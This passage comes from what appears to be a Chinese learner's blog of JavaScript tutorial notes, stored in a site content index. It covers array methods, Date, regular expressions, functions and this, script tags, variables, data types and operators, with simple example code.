0, 9, 1, 2, 0, 2, 0, 0, 1], [2, 0, 1, 9, 0, 9, 1, 2, 0, 2, 0, 2, 3]]; //for循环 for (var i = 0; i &lt; message.length; i++) &#123;//遍历行 for (var j = 0; j &lt; message[i].length; j++) &#123;//遍历列 console.log(message[i][j]); &#125; &#125; //for……in循环,推荐 for (var a in message) &#123; for (var b in message[a]) &#123; console.log(message[a][b]); &#125; &#125; //forEach循环 message.forEach(function (v) &#123; v.forEach(function (value, index, array) &#123; console.log(value, index, array); &#125;) &#125;) &lt;/script&gt;&lt;/html&gt; 15.2.3 对象中的方法对象中常用的方法ECMAScript为操作已经包含在数组中的元素提供了很多方法。这里主要讲一些常用的方法，push、concat、 pop、splice、reverse、join。 push方法该方法会把一个元素或一组元素（数组）添加到当前数组的末尾。 123var arr1 = [1, 2, 3];arr1.push(4, 5);//arr1的结果是[1, 2, 3, 4, 5] concat方法该方法会把两个或多个数组或元素组合在一起，但是不会改变调用者的结构。 12345var arr1 = [1, 2, 3];var arr2 = [4, 5];var arr3 = arr1.concat(arr2);//arr1的值：[1, 2, 3];//arr3的值：[1, 2, 3, 4, 5] pop方法该方法作用是删除数组中最后一个元素，并返回删除的元素。 1234var arr1 = [1, 2, 3];var val = arr1.pop();//val的值：3//arr1的值：[1, 2] splice方法该方法能删除指定的元素，或者插入指定的元素，函数原型 splice(index,howmany,element1,…..,elementX)**，index表示要删除的开始下标, howmany表示要删除的元素个 数,element（可选）从index开始，要插入的元素,该方法的返回值是被删除掉的那部分数组**。 可以实现替换、添加、删除。 123456var arr1 = [1, 2, 3, 4, 5];var arr2 = arr1.splice(0, 2);alert(arr1);alert(arr2);//arr1的值：[3, 4, 5]//arr2的值：[1, 2] reverse方法该方法颠倒数组中元素的顺序，调用后就永久改变，不是临时的。 123var arr1 = [1, 2, 3, 4, 5];arr1.reverse();//arr1的值：[5,4,3,2,1] join方法返回一个字符串，字符串的内容是数组的所有元素，元素之间通过指定的分隔符进行分隔。 1234var arr1 = [1, 2, 3];var str = arr1.join(&quot;--&quot;);alert(str);//str的值：1--2--3 shift方法删除数组第一个元素。 unshift方法向数组头部添加数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;数组方法&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var s = [1, 2, 3]; console.log(s); s.push(10); s.push(&#x27;Hello&#x27;); s.push(true); s.push(undefined); s.push([1, 2, 3]); console.log(s); //每次只能删除最后一个元素。 var res = s.pop(); console.log(s); console.log(res); //unshift s.unshift([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]); s.unshift(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;); console.log(s); /*shift，和pop类似*/ s.shift(); s.shift(); s.shift(); res = s.shift(); console.log(res) console.log(s); /*contact*/ var x = [&#x27;徐文&#x27;, &#x27;天明&#x27;, &#x27;残风&#x27;]; var y = s.concat(x, &#x27;绝命毒师&#x27;); console.log(y); /*倒叙输出*/ console.log(s.reverse()); console.log(s);// 永久改变数组 //join返回string console.log(s.join(&#x27;&#x27;)); console.log(s); //splice,删除功能 console.log(s.splice(0,5)); console.log(s); //splice,替换功能 s.splice(0,2,1,212,12,1,21,2); console.log(s); //splice,添加功能 ---- splice(A,0,C)：在下标A处的前面添加C s.splice(0,0,&#x27;诺亚&#x27;); s.splice(s.length,0,&#x27;夏娃&#x27;); console.log(s); &lt;/script&gt;&lt;/html&gt; 15.3 时间和日期Javascript如何处理时间和日期？ ECMAScript提供了Date类型来处理时间和日期。Date类型内置一系列获取和设置日期时间信息的方法。 15.3.1 Date类型Date类型介绍JS中的Date类型使用UTC（Coordinated Universal Time，国际协调时间）自1970年1月1日0时开始经过的毫 秒数来保存时间。 使用new操作符创建一个日期对象；在调用Date构造函数而不传递参数的情况下，新创建的对象自动获得当前 的日期和时间。 12var date = new Date();alert(date); //Fri Jul 13 2018 05:54:16 GMT+0800 (中国标准时间) 创建特定的日期和时间var date = new Date(年，月（0~11），日（1-31），时（0~23），分，秒); //年、月为必需，其它可选，默 认为0。 123var date = new Date(2015,4,15,17,55,55); //Fri May 15 2015 17:55:55 GMT+0800//Date.now()方法，返回一个从1970年1月1日0时开始到调用这个方法的此时此刻经过的毫秒数。var date = Date.now(); //1531432716661 15.3.2 日期、时间方法getTime()，返回毫秒数，//setTime()，以毫秒设置日期，会改变整个日期。 getFullYear()，返回年份，以4位数表示。//setFullYear()，设置日期的年月，必须以4位数表示。 getMonth()，返回月份，0~11。 getDate()，返回天数，1~31。 getDay()，返回星期几。 getHours()，返回小时数，0~23。 getMinutes()，返回分钟数，0~59。 getSeconds()，返回秒数，0~59。 getMilliseconds()，返回毫秒数。 123var date = new Date(); alert(&quot;现在的时间是：&quot;+date.getFullYear()+&quot;年&quot;+(date.getMonth()+1)+&quot;月&quot;+date.getDate()+&quot;日&quot;+date.getHours()+&quot;时&quot;+date.getMinutes()+&quot;分&quot;+date.getSeconds()+&quot;秒。&quot;); //现在的时间是：2021年5月27日15时41分56秒。 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;date&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; var time_now = new Date(); alert(time_now); // var date = new Date(2013,8,31,9,30,45); //Tue Oct 01 2013 09:30:45 GMT+0800 (中国标准时间) // alert(date); //Date.now()方法，返回一个从1970年1月1日0时开始到调用这个方法的此时此刻经过的毫秒数。 // var date_1 = Date.now(); //1531432716661 // alert(date_1); var date = new Date(); alert(&quot;现在的时间是：&quot;+date.getFullYear()+&quot;年&quot;+(date.getMonth()+1)+&quot;月&quot;+date.getDate()+&quot;日&quot;+date.getHours()+&quot;时&quot;+date.getMinutes()+&quot;分&quot;+date.getSeconds()+&quot;秒。&quot;); //现在的时间是：2021年5月27日15时41分56秒。 alert(date.getDay()); &lt;/script&gt;&lt;/html&gt; 15.4 正则表达式15.4.1 正则表达式介绍什么是正则表达式正则表达式(regular expression)是一个描述字符模式的对象。ECMAScript的RegExp类表示正则表达式，而 String和RegExp都定义了使用正则表达式进行强大的模式匹配和文本检索与替换的函数。 正则表达式的作用正则表达式主要用来验证客户端的输入数据。用户填写完表单单击按钮之后，表单就会被发送到服务器，在服 务器端通常会用JAVA、PHP、ASP.NET等服务器脚本对其进行进一步处理。因为客户端验证，可以节约大量的服务 器端的系统资源，并且提供更好的用户体验。 15.4.2 创建正则表达式如何创建正则表达式建正则表达式和创建字符串类似，创建正则表达式提供了两种方法，一种是采用new运算符，另一个是采用字 面量方式。 new运算符创建正则表达式它接收两个参数：一个是要匹配的字符串模式，另一个是可选的标志字符串。 12var pattern = new RegExp(&quot;[bc]at&quot;,&quot;i&quot;);//匹配第一个bat或者cat,不区分大小写 采用字面量方式创建正则表达式与new运算符方式类似，它也可以看作是接收两个参数：一个是要匹配的字符串模式，另一个是可选的标志字 符串。 1var pattern = /[bc]at/i; //匹配第一个bat或者cat,不区分大小写 15.4.3 正则表达式方法常用的正则表达式方法正则表达式有很多方法，在这里只选几个比较常用的来讲解： exec()方法 test()方法 search()方法 match()方法 replace()方法 exec()方法该方法是专门为捕获组而设计的，其接受一个参数，即要应用模式的字符串，然后返回包含第一个匹配项信息 的数组；或者在没有匹配项的情况下返回null。返回的数组虽然是Array的实例，但是包含两个额外的属性：index 和input。其中index表示匹配项在字符串中的位置，而input表示应用字符串表达式的字符串。 12345678var text = &quot;mom and dad and baby&quot;;var pattern = /mom( and dad( and baby)?)?/gi;var matches = pattern.exec(text);console.log(matches.index); //0console.log(matches.input); //mom and dad and babyconsole.log(matches[0]); //mom and dad and babyconsole.log(matches[1]); //and dad and babyconsole.log(matches[2]); //and baby test()方法正则表达式常用方法test()，它接受一个字符串参数。在模式与该参数匹配的情况下返回true，否则返回 false。 12345678//判断是否是数字var str = &#x27;374829348791&#x27;;var re = /\\D/; // \\D代表非数字if( re.test(str) )&#123; // 返回false,代表在字符串中找不到非数字。 alert(&#x27;不全是数字&#x27;);&#125;else&#123; alert(&#x27;全是数字&#x27;);&#125; search()方法在字符串搜索符合正则的内容，搜索到就返回出现的位置（从0开始，如果匹配的不只是一个字母，那只会返 回第一个字母的位置）， 如果搜索失败就返回 -1。 1234var str = &#x27;abcdef&#x27;;var re = /B/i;//var re = new RegExp(&#x27;B&#x27;,&#x27;i&#x27;); 也可以这样写alert( str.search(re) ); // 1 match ()方法获取正则匹配到的结果，以数组的形式返回。 1&quot;186a619b28&quot;.match(/\\d+/g); // [&quot;186&quot;,&quot;619&quot;,&quot;28&quot;] replace()方法 replace 本身是JavaScript字符串对象的一个方法，它允许接收两个参数： 1replace([RegExp|String],[String|Function]) 第1个参数可以是一个普通的字符串或是一个正则表达式，第2个参数可以是一个普通的字符串或是一个回调函数。 1234var phone = &quot;13112345678&quot;;var sliceNumber = 1234;var newPhone = phone.replace(new RegExp(sliceNumber ,&#x27;g&#x27;),&#x27;\\\\&#x27;);console.log(newPhone); //131\\5678 15.4.4 常用的正则表达式1、用户名正则12/用户名正则，4到16位（字母，数字，下划线，减号）var uPattern = /^[a-zA-Z0-9_-]&#123;4,16&#125;$/; 2、密码强度正则12//密码强度正则，最少6位，包括至少1个大写字母，1个小写字母，1个数字，1个特殊字符var pPattern = /^.*(?=.&#123;6,&#125;)(?=.*\\d)(?=.*[A-Z])(?=.*[a-z])(?=.*[!@#$%^&amp;*? ]).*$/; 3、Email正则12//Email正则var ePattern = /^([A-Za-z0-9_\\-\\.])+\\@([A-Za-z0-9_\\-\\.])+\\.([A-Za-z]&#123;2,4&#125;)$/; 4、手机号码正则12//手机号正则var mPattern = /^[1][3][0-9]&#123;9&#125;$/; 5、身份证号正则123//身份证号（18位）正则var cP = /^[1-9]\\d&#123;5&#125;(18|19|([23]\\d))\\d&#123;2&#125;((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\\d&#123;3&#125;[0-9Xx]$/; 6、车牌号正则123//车牌号正则var cPattern = /^[京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领A-Z]&#123;1&#125;[A-Z]&#123;1&#125;[A-Z0-9]&#123;4&#125;[A-Z0-9挂学警港澳]&#123;1&#125;$/; 7、包含中文正则12//包含中文正则var cnPattern = /[\\u4E00-\\u9FA5]/; 8、十六进制颜色正则12//RGB Hex颜色正则var cPattern = /^#?([a-fA-F0-9]&#123;6&#125;|[a-fA-F0-9]&#123;3&#125;)$/; 15.5 Function类型Function类型介绍在ECMAScript中，Function(函数)类型实际上是对象。每个函数都是Function类型的实例，而且都与其他引用 类型一样具有属性和方法。由于函数是对象，因此函数名实际上也是一个指向函数对象的指针。 15.5.1 函数的声明方式1．普通的函数声明 123function box(num1, num2) &#123; return num1+ num2; &#125; 2．使用变量初始化函数 123var box= function(num1, num2) &#123; return num1 + num2; &#125;; 3．new Function创建函数对象。 12345var fn3 = new Function();fn3 = function()&#123;&#125;;fn3(); 4 . 传参可以传：变量、对象、字面量、函数、表达式、数组 123456&lt;script&gt; function info(obj,info = &#x27;哈皮&#x27;)&#123; return obj.name + &#x27;///&#x27; + obj.sex + &#x27;///&#x27; + info; &#125; console.log(info(&#123;name:&#x27;加加林&#x27;,sex:&#x27;男&#x27;,age:19&#125;));&lt;/script&gt; 15.5.2 作为值的函数什么是作为值的函数ECMAScript中的函数名本身就是变量，所以函数也可以作为值来使用。也就是说，不仅可以像传递参数一样 把一个函数传递给另一个函数，而且可以将一个函数作为另一个函数的结果返回。 1234567function box(sumFunction, num) &#123; return sumFunction(num); &#125; function sum(num) &#123; return num + 10; &#125; var result = box(sum, 10); //传递函数到另一个函数里 15.5.3 函数内部属性函数内部属性在函数内部，有两个特殊的对象：arguments和this。arguments是一个类数组对象，包含着传入函数中的所有参数，主要用途是保存函数参数。但这个对象还有一个名叫callee的属性，该属性是一个指针，指向拥有这个 arguments对象的函数。 使用arguments.callee来执行自身 对于阶乘函数一般要用到递归算法，所以函数内部一定会调用自身；如果函数名不改变是没有问题的，但一旦 改变函数名，内部的自身调用需要逐一修改。为了解决这个问题，我们可以使用arguments.callee来代替。 可以提高程序的可扩展性和可移植性。 12345678//阶乘function box(num) &#123; if (num &lt;= 1) &#123; return 1; &#125; else &#123; return num * arguments.callee(num-1);//使用callee来执行自身 &#125; &#125; this指的是什么函数内部另一个特殊对象是this，其行为与Java和C#中的this大致相似。换句话说，this指向的是这个函数执行所操作的当前对象，或者说函数调用语句所处的那个作用域。 注意：当在全局作用域中调用函数时，this对象引用的就是window。 在JS中没有global这个全局对象，而JS的全局对象是windows。 12345678910window.color = &#x27;红色的&#x27;; //全局的alert(this.color); //打印全局的color var box = &#123; color : &#x27;蓝色的&#x27;, //局部的color sayColor : function () &#123; alert(this.color); //此时的this只能box里的color &#125;&#125;; box.sayColor(); //打印局部的color alert(this.color); //还是全局的 12345&lt;script&gt; y = 100;//等价于 windows.y = 100; console.log(y);//100 console.log(this.y);//100，这里的this代表的是window&lt;/script&gt; 123456789101112&lt;script&gt; var name = &#x27;李四&#x27;; // window.name = &#x27;李四&#x27;; var obj = &#123; name:&#x27;张三&#x27;, age:19, fn:function ()&#123; console.log(this.name + &#x27;,&#x27; + this.age); // this指向当前指向这个函数的对象 &#125; &#125; console.log(this.name);//李四 ,this指向window obj.fn(); // 张三，19&lt;/script&gt; 实训 将[1,2,2,3,5,4,3,3,3,3,5,4,6,7,6,9,9,9,9]数组去重复。 12345678910&lt;script&gt; //将[1,2,2,3,5,4,3,3,3,3,5,4,6,7,6,9,9,9,9]数组去重复 var a = [1,2,2,3,5,4,3,3,3,3,5,4,6,7,6,9,9,9,9],b = []; for(var i =0;i&lt;a.length;i++)&#123; if(b.indexOf(a[i]) &lt; 0)&#123; //indexOf()用来返回指定数据在数组中出现的下标，如果没有找到，返回-1。 b.push(a[i]); &#125; &#125; console.log(b)&lt;/script&gt;","categories":[],"tags":[{"name":"JS","slug":"JS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/JS/"}]},{"title":"JavaScript基础","slug":"前端学习15","date":"2021-05-25T12:27:35.000Z","updated":"2021-05-31T11:21:31.314Z","comments":true,"path":"2021/05/25/前端学习15/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/05/25/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A015/","excerpt":"","text":"第14章 JavaScript基础课程提要 JavaScript概述 使用JavaScript 语法、关键词保留字及变量 数据类型 运算符 流程控制语句 14.1 Javascript概述14.1.1 什么是JavaScriptJavaScript是一种具有面向对象能力的、解释型的程序设计语言。更具体一点，它是基于对象和事件驱动并具 有相对安全性的客户端脚本语言。因为他不需要在一个语言环境下运行，而只需要支持它的浏览器即可。 它的主要目的是：验证发往服务器端的数据、增加Web互动、加强用户体验度等。 一个网页由三部分组成：结构（HTML\\HTML5）、表现（CSS/CSS3）、行为（JavaScript-前端开发的核心） 14.1.2 JavaScript特点松散性JavaScript语言核心与C、C++、Java相似，比如条件判断、循环、运算符等。但，它却是一种松散类型的语 言，也就是说，它的变量不必具有一个明确的类型。 JS是一种弱类型的语言（允许将一块内存看做多种类型）。 对象属性 JavaScript中的对象把属性名映射为任意的属性值。它的这种方式很像哈希表或关联数组，而不像C中的结构体 或者C++、Java中的对象。 继承机制 JavaScript中的面向对象继承机制是基于原型的，这和另外一种不太为人所知的Self语言很像，而和C++以及 Java中的继承大不相同。 基于原型继承机制。 14.1.3 Javascript核心虽然JavaScript和ECMAScript通常被人们用来表达相同的含义，但JavaScript的含义却比ECMA-262中规定的要 多得多。 一个完整的JavaScript应该由下列三个不同的部分组成： 核心（ ECMAScript ECMA-262） 文档对象模型 （ DOM W3C ） 浏览器对象模型 （ BOM 无标准） ECMAScript介绍 ECMAScript是一种由Ecma国际（前身为欧洲计算机制造商协会,英文名称是European Computer Manufacturers Association）通过ECMA-262标准化的脚本程序设计语言。这种语言在万维网上应用广泛，它往往 被称为JavaScript或JScript， 但实际上后两者是ECMA-262标准的实现和扩展。 基础语言部分：基础、面向对象等 文档对象模型 （ DOM ）介绍 文档对象模型(DOM，Document Object Model)是针对XML但经过扩展用于HTML的应用程序编程接口(API， Application Programming Interface)。DOM有三个级别，每个级别都会新增很多内容模块和标准(有兴趣可以搜索 查询)。 节点操作：动态添加标签、样式 浏览器对象模型 （ BOM）介绍 访问和操作浏览器窗口的浏览器对象模型(BOM，Browser Object Model)。开发人员使用BOM可以控制浏览 器显示页面以外的部分。而BOM真正与众不同的地方(也是经常会导致问题的地方)，还是它作为JavaScript实现的 一部分，至今仍没有相关的标准。 浏览器操作 14.2 使用javascript14.2.1 script标签解析&lt;script&gt;&lt;script&gt;这组标签，是用于在html页面中插入js的主要方法，可以写在网页任意位置，因为JS是同步执行的，但为了避免JS阻塞，最好写在body后。它主要有以下几个属性： type：必需。表示代码使用的脚本语言的内容类型。例如：type=”text/javascript”。 charset：可选。表示通过src属性指定的字符集。 （现在开发一般不用） defer：可选。表示脚本可以延迟到文档完全被解析和显示之后再执行。（现在开发一般不用） src：可选。表示包含要执行代码的外部文件。（只能用于引入JS文件） async：可选。规定异步执行脚本（仅适用于外部脚本），在加载DOM元素的同时可以允许JS代码。 JS阻塞例子： 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script type=&quot;text/javascript&quot; defer=&quot;defer&quot; charset=&quot;utf-8&quot;&gt; // defer：表示所有DOM元素加载完成后，再加载这段JS代码 // charset：字符编码 alert(&#x27;写出的第一个JS程序！&#x27;); alert(&#x27;写出的第二个JS程序！&#x27;); // 表示弹出一个弹窗 &lt;/script&gt; &lt;/head&gt; &lt;body&gt;ddd &lt;/body&gt;&lt;/html&gt; 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt;ddd &lt;/body&gt; &lt;script type=&quot;text/javascript&quot; defer=&quot;defer&quot; charset=&quot;utf-8&quot;&gt; // defer：表示所有DOM元素加载完成后，再加载这段JS代码 // charset：字符编码 alert(&#x27;写出的第一个JS程序！&#x27;); alert(&#x27;写出的第二个JS程序！); // 表示弹出一个弹窗 &lt;/script&gt;&lt;/html&gt; 前者未加载body，后者加载body。 在a标签的href中写JS代码（但实际开发中不建议使用，因为代码会影响性能）。 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;javascript:var a=10,b=20;alert(&#x27;结果为：&#x27;+(a+b))&quot;&gt;计算结果&lt;/a&gt; &lt;a href=&quot;javascript:close()&quot;&gt;&amp;times;&lt;/a&gt; &lt;a href=&quot;javascript:void(1)&quot;&gt;test;&lt;/a&gt;&lt;!--阻止刷新整个页面--&gt; &lt;a href=&quot;&quot;&gt;test;&lt;/a&gt;&lt;!--刷新整个页面--&gt; &lt;/body&gt;&lt;/html&gt; 使用Script标签(只在当前文件有效)：略 任意位置可以用Script标签引入外部JS文件（共享）。 1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;script src=&quot;../js/1.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 注意： 要输出script结束标签时，必须拆开写： 1alert(&#x27;&lt;/scr&#x27;+&#x27;ipt&gt;&#x27;); 带有src属性的script元素不应该在其标签之间再包含额外的JavaScript代码，因为它会被忽略。 14.2.2 js代码嵌入的一些问题如果你想弹出一个标签的字符串，那么浏览器会误解成JS代码已经结束了。解决的方法，就是把字符 串分成两个部分，通过连接符+来连接。 实例： 14.3 语法、关键保留字及变量14.3.1 语法区分大小写 ECMAScript中的一切，包括变量、函数名和操作符都是区分大小写的。例如：book和Book表示两种不同的变 量。 标识符 所谓标识符，就是指变量、函数、属性的名字，或者函数的参数。标识符可以是下列格式规则组合起来的一或 多个字符： 第一字符必须是一个字母、下划线（_）或一个美元符号（$）。 其他字符可以是字母、下划线、美元符号或数字。 不能把关键字、保留字、true、false和null作为标识符。 注释 ECMAScript使用C风格的注释，包括单行注释和块级注释，注释语句在浏览器中不会被解析执行，只是起说明作用。多写注释，方便维护。 实例： 1234567&lt;script type=&quot;text/javascript&quot;&gt;//单行注释，一般用于当前行的代码解释/*这是一个多行注释，也叫块注释，一般用于对下面的代码进行整体说明，且说明内容可能较多。*/&lt;/script&gt; 直接量(常量/字面量literal) 程序中直接显示出来的数据值，不可以改变。 如： 12345100 //数字字面量‘前端开发&#x27; //字符串字面量false //布尔字面量/js/gi //正则表达式字面量null //对象字面量 14.3.2 关键字和保留字什么是关键字 ECMAScript-262描述了一组具有特定用途的关键字，一般用于控制语句的开始或结束，或者用于执行特定的 操作等。关键字也是语言保留的，不能用作标识符。 ECMAScript关键字 12break、else、new、var、case、finally 、return 、void、catch、for、switch、while、continue、function、this、with、default、if、throw、delete、in、try、do、instanceof、typeof等 什么是保留字 ECMAScript-262还描述了另一组不能用作标识符的保留字。尽管保留字在JavaScript中还没有特定的用途，但 它们很有可能在将来被用作关键字。 123abstract、enum、int、short、boolean、export、interface、static、byte、extends、long、super、char、final、native、synchronized、class、float、package、throws、const、goto、private、transient、debugger、implements、protected、volatile、double、import、public等 注意：在JS中任意地方严格区分大小写！！！ 14.3.3 变量什么是变量 ECMAScript的变量是松散类型的，所谓松散类型就是用来保存任何类型的数据。定义变量时要使用var操作符 （var是关键），后面跟一个变量名（变量名是标识符）。命名要符合上面的规范。 实例： 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; /*定义变量*/ var x = 10;//定义一个内存变量，初始值为10 /* * 项目需求：编写一个键盘输入用户名，然后在浏览器中输出。 * 步骤：引入prompt方法 * 输出到浏览器中 * */ var user = prompt(&#x27;请输入您的姓名：&#x27;); // 从键盘输入的内容存到内存变量user中 document.write(&#x27;您的姓名为：&#x27;+user); // document.write()表示输出到浏览器中 &lt;/script&gt;&lt;/html&gt; 所谓变量，就是可以初始化后可以再次改变的量。ECMAScript属于弱类型(松散类型)的语言，可以同时改变不同类型的量。 说明： 定义变量时，不需要给出变量类型（松散式语言）。 变量也可以重复定义，后面定义的会覆盖前面定义的变量。 不用var定义对象也可以，默认是Windows对象添加了一个属性。 定义的变量没有赋值，默认值为Underfined。 一条语句可以以一个 ;结束，也可以不加，如果多条语句写在同一行上，那么必须加分号隔开。 在书写代码时，除了字符串中可以使用中文标点之外，其他任何只能使用英文标点。 注意：虽然可以改变不同类型的量，但这样做对于后期维护带来困难，而且性能也不高，导致成本很高！ 定义： 只定义变量 12var x;var a,b,c; 定义数值 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;script&gt; &#x27;use strict&#x27;;//严格代码模式（变量必须先定义后使用） var x = 1; var x = 2; name = &#x27;周三&#x27;; console.log(x); /*用于开发时的测试*/ console.log(name); console.log(typeof(name)); // string &lt;/script&gt;&lt;/html&gt; 14.4 数据类型数据类型介绍 ECMAScript中有5种简单数据类型：undefined、null、boolean、number和string。还有一种复杂数据类型 ——object。ECMAScript不支持任何创建自定义类型的机制，所有值都成为以上6中数据类型之一。 数据类型：指的是内存存储方式。 14.4.1 typeof操作符typeof操作符是用来检测变量的数据类型。对于值或变量使用typeof操作符会返回如下字符串。 基本数据类型 字符串 描述 undefined 未定义 boolean 布尔型 string 字符串 null 空 number 数值（表示数字，通常可用作进行+-*/%等运算） 引用数据类型 字符串 描述 object 对象 function 函数 14.4.1 typeof操作符typeof操作符是用来检测变量的数据类型。对于值或变量使用typeof操作符会返回如下字符串。 typeof操作符可以操作变量，也可以操作字面量。虽然也可以这样使用：typeof(company)，但，typeof是操 作符而非内置函数。 注意：函数在ECMAScript中是对象，不是一种数据类型。所以，使用typeof来区分function和object是非常有必 要的。 14.4.2 undefined类型什么是undefinedundefined类型只有一个值，即特殊的undefined。在使用var声明变量，但没有对其初始化时，这个变量的值 就是undefined。 14.4.3 null类型什么是nullnull类型是一个只有一个值的数据类型，即特殊的值null。它表示一个空对象引用(指针)，而typeof操作符检测 null会返回object。 说明：undefined是派生自null的，因此ECMA-262规定对它们的相等性测试返回true。由于undefined和null 两个值的比较是相等的，所以，未初始化的变量和赋值为null的变量会相等。这时，可以采用typeof变量的类型进行比较。但建议还是养成编码的规范，不要忘记初始化变量。 14.4.4 boolean类型什么是boolean类型boolean类型有两个值(字面量)：true和false。而true不一定等于1，false不一定等于0。JavaScript是区分大 小写的，True和False或者其他都不是Boolean类型的值。 虽然Boolean类型的字面量只有true和false两种，但ECMAScript中所有类型的值都有与这两个Boolean值等价 的值。要将一个值转换为其对应的Boolean值，可以使用转型函数**Boolean()**。 数据类型 转换为true的值 转换为false的值 boolean true false string 任何非空字符串 空字符串 number 任何非零数字值(包括无穷大) 0和NaN object 任何对象 null undefined undefined 14.4.5 number类型什么是number类型number类型包含两种数值：整型和浮点型。为了支持各种数值类型，ECMA-262定义了不同的数值字面量格 式。 不同的进制123456// 最基本的数值字面量是十进制整数。var box = 100; //十进制整数 // 八进制数值字面量，(以8为基数)，前导必须是0，八进制序列(0~7)。 var box = 070; //八进制，56 // 十六进制字面量前面两位必须是0x，后面是(0~9及A~F)。 var box = 0xA; //十六进制，10 浮点类型浮点类型，就是该数值中必须包含一个小数点，并且小数点后面必须至少有一位数字。 NaN是什么NaN，即非数值(Not a Number)是一个特殊的值，这个数值用于表示一个本来要返回数值的操作数未返回数 值的情况(这样就不会抛出错误了)。ECMAScript提供了isNaN()函数，用来判断这个值到底是不是NaN。 isNaN()函 数在接收到一个值之后，会尝试将这个值转换为数值。 1234567&lt;script type=&quot;text/javascript&quot;&gt; alert(isNaN(NaN)); //true alert(isNaN(25)); //false，25是一个数值 alert(isNaN(&#x27;25&#x27;)); //false，&#x27;25&#x27;是一个字符串数值，可以转成数值 alert(isNaN(&#x27;Lee&#x27;)); //true，&#x27;Lee&#x27;不能转换为数值 alert(isNaN(true)); //false，true可以转成成1 &lt;/script&gt; 注意：可以转换为数值类型的其他类型的数据isNaN()返回false 14.4.6 string类型string类型的介绍string类型用于表示由于零或多个16位Unicode字符组成的字符序列，即字符串。字符串可以由双引号(“)或单 引号(‘)表示。这两种表示方法没有任何区别。但要记住的是，必须成对出现，不能穿插使用，否则会出错。 ECMAScript中的字符串是不可变的，也就是说，字符串一旦创建，它们的值就不能改变。要改变某个变量保 存的字符串，首先要销毁原来的字符串，然后再用另一个包含新值的字符串填充该变量。 注意：无论是单引号还是双引号，只要是英文的，都要加\\进行转义。 14.4.7 object类型object类型的介绍ECMAScript中的对象其实就是一组数据和功能的集合。对象可以通过执行new操作符后跟要创建的对象类型 的名称来创建，用来申明或存储一个对象（函数、对象、正则、字符对象、数值对象等）。 14.5 运算符运算符的介绍ECMA-262描述了一组用于操作数据值的运算符，包括 一元运算符 算术运算符 关系运算符 逻辑运算符 三元运算符 位运算符（不讲，因为一般不用） 字符串运算符(+ - 拼接/连接) 实现字符串之间的连接。 数值与字符串进行 + 运算时，数值型会自动转换为字符，再运算。 1console.log(123 + &#x27;abc&#x27;); boolean型数值与字符串进行 + 运算时，boolean型数值会自动转换为字符，再运算。 underfined与字符串进行 + 运算时，undedined会自动转换为字符，再运算。 输出字符串长度 1console((&#x27;aaa&#x27;+&#x27;bbb&#x27;).length);//6 ECMAScript中的运算符适用于很多值，包括字符串、数值、布尔值、对象等。 14.5.1 一元运算符什么是一元运算符只能操作一个值的运算符叫做一元运算符。 1．递增++和递减–123456789&lt;script type=&quot;text/javascript&quot;&gt; var box = 100; ++box; //把box累加一个1，相当于box = box+1 --box; //把box累减一个1，相当于box = box-1 box++; //同上 box--; //同上var x = 10var a = ++x +(++x) + x++ + x;// 11 12 12 13&lt;/script 2．前置和后置的区别在没有赋值操作，前置和后置是一样的。但在赋值操作时，如果递增或递减运算符前置，那么前置的运算符会 先累加或累减再赋值，如果是后置运算符则先赋值再累加或累减。 12345&lt;script type=&quot;text/javascript&quot;&gt; var box = 100; var age = ++box; //age值为101 var height = box++; //height值为100&lt;/script&gt; 14.5.2 算术运算符什么是算术运算符 ECMAScript定义了5个算术运算符，加减乘除求模(取余)。 取余运算结果符号与被除数保持一致。 1234567&lt;script type=&quot;text/javascript&quot;&gt; var box1 = 1+2;//加法，等于3 var box2 = 100-20;//减法，等于80 var box3 = 2*2;//乘法，等于4 var box4 = 100/50;//除法,等于2 var box5 = 10%3;//取余，等于1，余数为1&lt;/script&gt; 14.5.3 关系运算符什么是关系运算符 